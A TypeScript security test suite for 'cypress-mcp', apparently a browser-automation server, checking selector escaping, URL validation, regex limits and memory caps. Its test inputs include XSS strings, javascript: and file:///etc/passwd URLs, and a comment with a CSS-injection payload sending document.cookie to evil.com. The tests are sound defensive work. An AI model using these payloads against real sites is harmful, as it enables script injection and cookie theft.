/**
 * Security Tests for cypress-mcp
 */
import { resolveTarget, escapeSelector, validateUrl, sanitizeRegex } from '../src/tools/utils';
import { StateManager } from '../src/state/state-manager';
import { browserNavigate } from '../src/tools/navigation/index';
import { browserEvaluate } from '../src/tools/console/index';
import { browserNetworkRequests } from '../src/tools/network/index';
import { browserLocalStorage } from '../src/tools/storage/index';
import { browserClick } from '../src/tools/interaction/index';

let passed = 0, failed = 0;
const failures: string[] = [];

function test(name: string, fn: () => void | Promise<void>) {
  try {
    const r = fn();
    if (r instanceof Promise) {
      return r.then(() => { passed++; console.log(`  ✓ ${name}`); })
        .catch((e: any) => { failed++; failures.push(`${name}: ${e.message}`); console.log(`  ✗ ${name}: ${e.message}`); });
    }
    passed++; console.log(`  ✓ ${name}`);
  } catch (e: any) { failed++; failures.push(`${name}: ${e.message}`); console.log(`  ✗ ${name}: ${e.message}`); }
}

function assert(c: boolean, m: string) { if (!c) throw new Error(m); }
function assertEqual(a: any, b: any, m?: string) { if (a !== b) throw new Error(m || `Expected ${JSON.stringify(b)}, got ${JSON.stringify(a)}`); }

const mockBridge = { execute: async () => ({}) } as any;
const mockState = new StateManager();

// ═══════════════════════════════════════════
console.log('\n── JS Injection via escapeSelector ──');

test('escapes single quotes for JS string safety', () => {
  const r = escapeSelector("'; alert('xss');//");
  // When embedded in JS: var x = '<escaped>' — the quote should be backslash-escaped
  // Verify: no raw unescaped single quote (every ' preceded by \)
  const unescaped = r.replace(/\\'/g, ''); // Remove escaped quotes
  assert(!unescaped.includes("'"), `Unescaped quote found: ${r}`);
});

test('escapes backticks and template literals', () => {
  const r = escapeSelector('`${document.cookie}`');
  // Verify: $ is escaped, backtick is escaped
  const unescapedDollar = r.replace(/\\\$/g, '');
  const unescapedBacktick = r.replace(/\\`/g, '');
  assert(!unescapedDollar.includes('$'), `Unescaped $ found: ${r}`);
  assert(!unescapedBacktick.includes('`'), `Unescaped backtick found: ${r}`);
});

test('escapes backslashes first (correct order)', () => {
  const r = escapeSelector("\\'; alert(1);//");
  // Input has: backslash, quote, semicolon
  // After escape: \\\\ (escaped backslash) + \\' (escaped quote) + ; ...
  // Verify the backslash is doubled
  assert(r.startsWith('\\\\'), `Backslash not doubled: ${r}`);
});

test('strips null bytes', () => {
  const r = escapeSelector('test\0injection');
  assert(!r.includes('\0'), 'Null byte not stripped');
  assert(r === 'testinjection', `Unexpected: ${r}`);
});

test('escapes Unicode line separators', () => {
  const r = escapeSelector('test\u2028\u2029end');
  assert(r.includes('\\u2028'), 'U+2028 not escaped');
  assert(r.includes('\\u2029'), 'U+2029 not escaped');
});

test('handles non-string input', () => {
  assertEqual(escapeSelector(null as any), '');
  assertEqual(escapeSelector(undefined as any), '');
  assertEqual(escapeSelector(123 as any), '');
});

test('escapes double quotes', () => {
  const r = escapeSelector('test"injection');
  assert(r.includes('\\"'), 'Double quote not escaped');
});

// ═══════════════════════════════════════════
console.log('\n── URL Validation ──');

test('rejects javascript: URLs', () => {
  const r = validateUrl('javascript:alert(document.cookie)');
  assertEqual(r.valid, false);
  assert(r.error!.includes('javascript'), `Wrong error: ${r.error}`);
});

test('rejects JavaScript: (case insensitive)', () => {
  assertEqual(validateUrl('JavaScript:alert(1)').valid, false);
  assertEqual(validateUrl('JAVASCRIPT:void(0)').valid, false);
  assertEqual(validateUrl('  javascript:alert(1)').valid, false); // whitespace prefix
});

test('rejects data: URLs', () => {
  assertEqual(validateUrl('data:application/octet-stream;base64,xxx').valid, false);
});

test('rejects file: URLs', () => {
  assertEqual(validateUrl('file:///etc/passwd').valid, false);
});

test('allows http/https', () => {
  assertEqual(validateUrl('https://example.com').valid, true);
  assertEqual(validateUrl('http://localhost:3000').valid, true);
});

test('rejects empty/null URLs', () => {
  assertEqual(validateUrl('').valid, false);
  assertEqual(validateUrl(null as any).valid, false);
  assertEqual(validateUrl(undefined as any).valid, false);
});

// ═══════════════════════════════════════════
console.log('\n── Regex DoS Prevention ──');

test('rejects overly long regex', () => {
  const r = sanitizeRegex('a'.repeat(600));
  assert(r.regex === null, 'Should reject');
  assert(r.error!.includes('too long'), `Wrong error: ${r.error}`);
});

test('rejects invalid regex syntax', () => {
  const r = sanitizeRegex('[unclosed');
  assert(r.regex === null, 'Should reject');
});

test('allows valid regex', () => {
  const r = sanitizeRegex('/api/.*search');
  assert(r.regex !== null, 'Should accept');
});

test('truncates error message for invalid regex', () => {
  const r = sanitizeRegex('['.repeat(200));
  assert(r.error!.length < 200, `Error too long: ${r.error!.length}`);
});

// ═══════════════════════════════════════════
console.log('\n── Ref Validation ──');

test('accepts valid ref format', () => {
  assertEqual(resolveTarget({ ref: 'ref:14' }), '[data-mcp-ref="ref:14"]');
  assertEqual(resolveTarget({ ref: 'ref:0' }), '[data-mcp-ref="ref:0"]');
  assertEqual(resolveTarget({ ref: 'ref:9999' }), '[data-mcp-ref="ref:9999"]');
});

test('rejects malicious ref (CSS injection)', () => {
  // Attacker tries: ref:1"]/**/{ background: url('http://evil.com/steal?cookie='+document.cookie) }
  assertEqual(resolveTarget({ ref: 'ref:1"]{}' }), null);
  assertEqual(resolveTarget({ ref: 'malicious' }), null);
  assertEqual(resolveTarget({ ref: '' }), null);
  assertEqual(resolveTarget({ ref: 'ref:abc' }), null); // non-numeric
  assertEqual(resolveTarget({ ref: 'ref:-1' }), null);  // negative
});

// ═══════════════════════════════════════════
console.log('\n── Tool Input Validation ──');

test('navigate rejects javascript: URL', async () => {
  const nav = browserNavigate(mockBridge, mockState);
  const r: any = await nav.execute({ url: 'javascript:alert(1)' });
  assert('error' in r, 'Should reject');
  assertEqual(r.error.code, 'INVALID_URL');
});

test('navigate rejects file: URL', async () => {
  const nav = browserNavigate(mockBridge, mockState);
  const r: any = await nav.execute({ url: 'file:///etc/passwd' });
  assert('error' in r, 'Should reject');
});

test('evaluate rejects oversized script', async () => {
  const ev = browserEvaluate(mockBridge, mockState);
  const r: any = await ev.execute({ script: 'x'.repeat(200000) });
  assert('error' in r, 'Should reject');
});

test('evaluate rejects empty script', async () => {
  const ev = browserEvaluate(mockBridge, mockState);
  const r: any = await ev.execute({ script: '' });
  assert('error' in r, 'Should reject');
});

test('click rejects malicious ref', async () => {
  const click = browserClick(mockBridge, mockState);
  const r: any = await click.execute({ ref: '"; alert(1); //' });
  assert('error' in r, 'Should reject malicious ref');
  assertEqual(r.error.code, 'INVALID_SELECTOR');
});

test('network filter rejects long regex', async () => {
  const net = browserNetworkRequests(mockBridge, mockState);
  const r: any = await net.execute({ filter: 'a'.repeat(600) });
  assert('error' in r, 'Should reject');
  assertEqual(r.error.code, 'INVALID_FILTER');
});

test('localStorage rejects missing key for get/set/delete', async () => {
  const ls = browserLocalStorage(mockBridge, mockState);
  const r1: any = await ls.execute({ action: 'get' });
  assert('error' in r1, 'get without key should fail');
  const r2: any = await ls.execute({ action: 'set' });
  assert('error' in r2, 'set without key should fail');
  const r3: any = await ls.execute({ action: 'delete' });
  assert('error' in r3, 'delete without key should fail');
});

// ═══════════════════════════════════════════
console.log('\n── Data Exposure ──');

test('state manager caps prevent memory exhaustion', () => {
  const s = new StateManager();
  // Try to exhaust memory with network requests
  for (let i = 0; i < 2000; i++) {
    s.addNetworkRequest({
      id: i, url: 'http://x', method: 'GET', status: 200,
      resourceType: 'xhr', requestHeaders: {}, responseHeaders: {},
      requestBody: 'x'.repeat(1000), responseBody: 'y'.repeat(1000),
      duration: 1, timestamp: i, size: 2000,
    });
  }
  assert(s.networkRequests.length <= 600, `Unbounded growth: ${s.networkRequests.length}`);

  for (let i = 0; i < 1000; i++) {
    s.addConsoleMessage({ level: 'log', text: 'x'.repeat(500), timestamp: i });
  }
  assert(s.consoleMessages.length <= 500, `Console unbounded: ${s.consoleMessages.length}`);

  for (let i = 0; i < 500; i++) {
    s.addToHistory({ tool: 'test', params: {}, result: { success: true as const }, timestamp: i });
  }
  assert(s.commandHistory.length <= 200, `History unbounded: ${s.commandHistory.length}`);
});

// ═══════════════════════════════════════════
setTimeout(() => {
  console.log(`\n${'═'.repeat(50)}`);
  console.log(`  Security Test Results: ${passed} passed, ${failed} failed`);
  if (failures.length > 0) {
    console.log('\n  FAILURES:');
    failures.forEach(f => console.log(`    ✗ ${f}`));
  }
  console.log(`${'═'.repeat(50)}\n`);
  process.exit(failed > 0 ? 1 : 0);
}, 500);
